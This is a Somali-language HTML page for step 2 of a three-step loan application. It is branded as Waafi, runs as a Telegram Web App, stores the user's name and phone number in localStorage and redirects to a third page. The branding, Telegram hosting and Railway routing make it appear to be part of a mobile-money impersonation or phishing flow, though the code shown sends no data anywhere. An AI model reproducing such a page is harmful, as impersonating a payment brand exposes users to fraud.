<!DOCTYPE html>
<html lang="so">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Codsiga Amaahda - Step 2</title>

    <!-- FIXED Telegram SDK -->
    <script src="https://telegram.org/js/telegram-web-app.js"></script>

    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #f8f9fa;
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .nav-header {
            width: 100%;
            background: linear-gradient(90deg, #a4e433 0%, #4caf50 100%);
            padding: 15px 20px;
            color: white;
            display: flex;
            justify-content: space-between;
            align-items: center;
            box-sizing: border-box;
        }

        .back-link {
            display: flex;
            align-items: center;
            font-size: 22px;
            font-weight: 500;
            cursor: pointer;
        }

        .waafi-logo {
            font-size: 24px;
            font-weight: bold;
        }

        .form-card {
            background: white;
            width: 92%;
            max-width: 480px;
            margin-top: 25px;
            padding: 30px 20px;
            border-radius: 12px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.05);
            box-sizing: border-box;
        }

        h2 {
            text-align: center;
            margin: 0;
            font-size: 26px;
            color: #333;
            font-weight: 600;
        }

        .step-info {
            text-align: center;
            font-size: 15px;
            color: #888;
            margin: 10px 0 25px;
        }

        .progress-box {
            display: flex;
            gap: 8px;
            margin-bottom: 35px;
        }

        .bar {
            height: 4px;
            flex: 1;
            background: #e0e0e0;
            border-radius: 2px;
        }

        .active-bar {
            background: #82d13d;
        }

        .input-wrap {
            margin-bottom: 22px;
        }

        label {
            display: block;
            font-size: 16px;
            font-weight: 500;
            margin-bottom: 10px;
            color: #333;
        }

        input {
            width: 100%;
            padding: 15px;
            border: 1px solid #d1d1d1;
            border-radius: 8px;
            font-size: 17px;
            box-sizing: border-box;
        }

        .phone-container {
            display: flex;
            gap: 10px;
        }

        .country-code {
            width: 80px;
            background: #f9f9f9;
            text-align: center;
            font-weight: bold;
            border: 1px solid #d1d1d1;
        }

        .phone-hint {
            font-size: 12px;
            color: #777;
            margin-top: 8px;
        }

        .btn-container {
            margin-top: 30px;
            display: flex;
            flex-direction: column;
            gap: 15px;
        }

        .back-btn {
            background-color: #f1f1f1;
            color: #777;
            border: 1px solid #ddd;
            width: 100%;
            padding: 16px;
            border-radius: 10px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
        }

        .next-btn {
            background: linear-gradient(90deg, #a4e433 0%, #7dbd27 100%);
            color: white;
            border: none;
            width: 100%;
            padding: 18px;
            border-radius: 10px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            text-transform: uppercase;
        }

        .footer-text {
            text-align: center;
            font-size: 13px;
            color: #aaa;
            margin-top: 40px;
            padding-bottom: 30px;
        }
    </style>
</head>

<body>

<div class="nav-header">
    <div class="back-link" onclick="goBack()">← Dib u noqo</div>
    <div class="waafi-logo">Waafi</div>
    <div style="font-size: 26px;">☰</div>
</div>

<div class="form-card">
    <h2>Codsiga Amaahda</h2>
    <p class="step-info">Tallaabada 2 ee 3</p>

    <div class="progress-box">
        <div class="bar active-bar"></div>
        <div class="bar active-bar"></div>
        <div class="bar"></div>
    </div>

    <div class="input-wrap">
        <label>Magaca Hore</label>
        <input type="text" id="firstName" placeholder="Ahmed">
    </div>

    <div class="input-wrap">
        <label>Magaca Dambe</label>
        <input type="text" id="lastName" placeholder="Hassan">
    </div>

    <div class="input-wrap">
        <label>Lambarka Taleefanka</label>
        <div class="phone-container">
            <input type="text" class="country-code" value="+252" readonly>
            <input type="tel" id="phone" placeholder="612345678" maxlength="9">
        </div>
        <p class="phone-hint">Geli 9 tiro sax ah</p>
    </div>

    <div class="btn-container">
        <button class="back-btn" onclick="goBack()">KA HORE</button>
        <button class="next-btn" onclick="goNext()">TALLAABADA XIGTA</button>
    </div>
</div>

<div class="footer-text">© 2025 Waafi Soomaaliya</div>

<script>
    function goNext() {
        const fName = document.getElementById('firstName').value.trim();
        const lName = document.getElementById('lastName').value.trim();
        const phone = document.getElementById('phone').value.trim();

        if (!fName || !lName || !phone) {
            alert("Fadlan buuxi dhammaan meelaha banaan.");
            return;
        }

        if (phone.length !== 9) {
            alert("Geli number sax ah (9 digits).");
            return;
        }

        localStorage.setItem('firstName', fName);
        localStorage.setItem('lastName', lName);
        localStorage.setItem('phone', phone);

        // FIXED ROUTING FOR RAILWAY
        window.location.href = "/page3";
    }

    function goBack() {
        window.location.href = "/";
    }

    window.onload = () => {
        const tg = window.Telegram?.WebApp;
        if (tg) {
            tg.ready();
            tg.expand();
        }

        // Auto-fill
        const f = localStorage.getItem('firstName');
        const l = localStorage.getItem('lastName');
        const p = localStorage.getItem('phone');

        if (f) document.getElementById('firstName').value = f;
        if (l) document.getElementById('lastName').value = l;
        if (p) document.getElementById('phone').value = p;
    };
</script>

</body>
</html>
